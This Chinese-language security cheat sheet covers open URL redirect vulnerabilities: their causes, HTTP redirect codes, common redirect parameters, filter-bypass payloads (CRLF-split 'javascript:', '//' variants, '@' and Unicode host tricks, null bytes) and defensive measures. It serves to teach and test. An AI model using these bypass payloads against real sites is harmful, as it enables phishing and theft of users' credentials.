# 开放重定向漏洞 (Open URL Redirect)

> 当Web应用程序接受不受信任的输入，并可能导致Web应用程序将请求重定向到不受信任输入中包含的URL时，就会发生未经验证的重定向和转发。通过将不受信任的URL输入修改为恶意站点，攻击者可能会成功发起钓鱼攻击并窃取用户凭据。由于修改后链接中的服务器名称与原始站点相同，钓鱼尝试可能看起来更可信。未经验证的重定向和转发攻击还可用于恶意构建一个URL，该URL会通过应用程序的访问控制检查，然后将攻击者转发到他们通常无法访问的特权功能。

## 开放重定向漏洞原理

开放重定向漏洞是指Web应用程序或服务器使用未经验证的用户提供的输入将用户重定向到其他站点的安全漏洞。攻击者可以利用此漏洞制作指向易受攻击站点的链接，该链接会将用户重定向到他们选择的恶意站点。

### 漏洞成因

1. **未经验证的重定向**：
   - 应用程序直接使用用户提供的URL参数进行重定向
   - 未对目标URL进行白名单验证
   - 未对重定向目标进行适当的域名检查

2. **不安全的实现方式**：
   - 使用JavaScript进行客户端重定向
   - 依赖黑名单而非白名单验证
   - 未正确处理URL编码和规范化

3. **框架默认行为**：
   - 某些Web框架默认提供重定向功能
   - 开发人员可能不了解重定向的安全影响
   - 默认配置可能不够安全

### 攻击面

- **钓鱼攻击**：诱导用户访问看似合法的链接
- **会话劫持**：窃取身份验证令牌或会话ID
- **恶意软件分发**：重定向到托管恶意软件的站点
- **信任滥用**：利用受信任域名的声誉
- **绕过安全控制**：规避CSRF保护或其他安全机制

### 影响

- 用户凭据泄露
- 恶意软件感染
- 品牌声誉受损
- 用户信任度下降
- 可能违反数据保护法规

## 目录

- [攻击方法](#攻击方法)
    - [HTTP重定向状态码](#http重定向状态码)
    - [重定向方法](#重定向方法)
        - [基于路径的重定向](#基于路径的重定向)
        - [基于JavaScript的重定向](#基于javascript的重定向)
        - [常见查询参数](#常见查询参数)
    - [过滤器绕过技术](#过滤器绕过技术)
- [防御措施](#防御措施)
- [实验环境](#实验环境)
- [参考资料](#参考资料)

## 攻击方法

开放重定向漏洞发生在Web应用程序或服务器使用未经验证的用户提供的输入将用户重定向到其他站点时。攻击者可以利用此漏洞在钓鱼攻击、会话窃取或迫使用户在未经同意的情况下执行操作。

**示例**：一个Web应用程序有一个功能，允许用户点击链接并自动重定向到保存的首选主页。实现可能如下所示：

```ps1
https://example.com/redirect?url=https://userpreferredsite.com
```

攻击者可以通过将`userpreferredsite.com`替换为指向恶意网站的链接来利用此开放重定向。然后，他们可以在钓鱼电子邮件或其他网站上分发此链接。当用户点击该链接时，他们会被带到恶意网站。

## HTTP重定向状态码

HTTP重定向状态码（以3开头的状态码）表示客户端必须采取额外操作才能完成请求。以下是一些最常见的状态码：

* [300 Multiple Choices](https://httpstatuses.com/300) - 表示请求有多个可能的响应。客户端应选择其中一个。
* [301 Moved Permanently](https://httpstatuses.com/301) - 表示请求的资源已永久移动到Location头中给出的URL。所有未来请求应使用新的URI。
* [302 Found](https://httpstatuses.com/302) - 表示请求的资源已临时移动到Location头中给出的URL。与301不同，它不表示资源已永久移动，只是暂时位于其他位置。
* [303 See Other](https://httpstatuses.com/303) - 服务器发送此响应以指示客户端使用GET请求获取所请求的资源到另一个URI。
* [304 Not Modified](https://httpstatuses.com/304) - 用于缓存目的。它告诉客户端响应未被修改，因此客户端可以继续使用相同的缓存响应版本。
* [305 Use Proxy](https://httpstatuses.com/305) - 必须通过Location头中提供的代理访问请求的资源。
* [307 Temporary Redirect](https://httpstatuses.com/307) - 表示请求的资源已临时移动到Location头中给出的URL，未来请求仍应使用原始URI。
* [308 Permanent Redirect](https://httpstatuses.com/308) - 表示资源已永久移动到Location头中给出的URL，未来请求应使用新的URI。与301类似，但不允许更改HTTP方法。

## 重定向方法

### 基于路径的重定向

重定向逻辑可能依赖于路径而非查询参数：

* 在URL中使用斜杠：`https://example.com/redirect/http://malicious.com`
* 注入相对路径：`https://example.com/redirect/../http://malicious.com`

### 基于JavaScript的重定向

如果应用程序使用JavaScript进行重定向，攻击者可能操纵脚本变量：

**示例**：

```js
var redirectTo = "http://trusted.com";
window.location = redirectTo;
```

**Payload**: `?redirectTo=http://malicious.com`

### 常见查询参数

```powershell
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnTo={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```

## 过滤器绕过技术

* 使用白名单域名或关键词

    ```powershell
    www.whitelisted.com.evil.com 重定向到 evil.com
    ```

* 使用**CRLF**绕过"javascript"黑名单关键词

    ```powershell
    java%0d%0ascript%0d%0a:alert(0)
    ```

* 使用"`//`"和"`////`"绕过"http"黑名单关键词

    ```powershell
    //google.com
    ////google.com
    ```

* 使用"https:"绕过"`//`"黑名单关键词

    ```powershell
    https:google.com
    ```

* 使用"`\/\/`"绕过"`//`"黑名单关键词

    ```powershell
    \/\/google.com/
    /\/google.com/
    ```

* 使用"`%E3%80%82`"绕过"."黑名单字符

    ```powershell
    /?redir=google。com
    //google%E3%80%82com
    ```

* 使用空字节"`%00`"绕过黑名单过滤器

    ```powershell
    //google%00.com
    ```

* 使用HTTP参数污染

    ```powershell
    ?next=whitelisted.com&next=google.com
    ```

* 使用"@"字符。[通用Internet方案语法](https://datatracker.ietf.org/doc/html/rfc1738)

    ```powershell
    //<user>:<password>@<host>:<port>/<url-path>
    http://www.theirsite.com@yoursite.com/
    ```

* 创建与目标域名相同的文件夹

    ```powershell
    http://www.yoursite.com/http://www.theirsite.com/
    http://www.yoursite.com/folder/www.folder.com
    ```

* 使用"`?`"字符，浏览器会将其翻译为"`/?`"

    ```powershell
    http://www.yoursite.com?http://www.theirsite.com/
    http://www.yoursite.com?folder/www.folder.com
    ```

* 主机/拆分Unicode规范化

    ```powershell
    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
    http://a.com／X.b.com
    ```

## 防御措施

1. **使用白名单验证**：
   - 维护允许域的白名单
   - 拒绝所有未明确允许的URL
   - 避免使用黑名单方法

2. **实施正确的重定向**：
   - 使用服务器端重定向而非客户端重定向
   - 避免使用用户提供的URL进行重定向
   - 使用映射ID而非完整URL

3. **安全编码实践**：
   - 对所有用户输入进行严格验证
   - 实施适当的URL规范化
   - 使用框架的安全重定向函数

4. **用户界面设计**：
   - 向用户显示重定向警告
   - 在UI中显示目标域名
   - 提供取消重定向的选项

5. **安全头信息**：
   - 实现Content-Security-Policy (CSP)
   - 使用Referrer-Policy头
   - 设置适当的X-Frame-Options

## 实验环境

* [Root Me - HTTP - 开放重定向](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
* [PortSwigger - 基于DOM的开放重定向](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)

## 参考资料

* [Unicode规范化中的主机/拆分可利用反模式 - Jonathan Birch - 2019年8月3日](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
* [开放重定向漏洞利用速查表 - PentesterLand - 2018年11月2日](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
* [开放重定向漏洞 - s0cket7 - 2018年8月15日](https://s0cket7.com/open-redirect-vulnerability/)
* [开放重定向Payload集合 - Predrag Cujanović](https://github.com/cujanovic/Open-Redirect-Payloads)
* [未经验证的重定向和转发漏洞利用速查表 - OWASP - 2024年2月28日](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
* [您不需要运行80个侦察工具来获取用户账户访问权限 - Stefano Vettorazzi (@stefanocoding) - 2019年5月16日](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
* [OWASP: 未验证的重定向和转发](https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
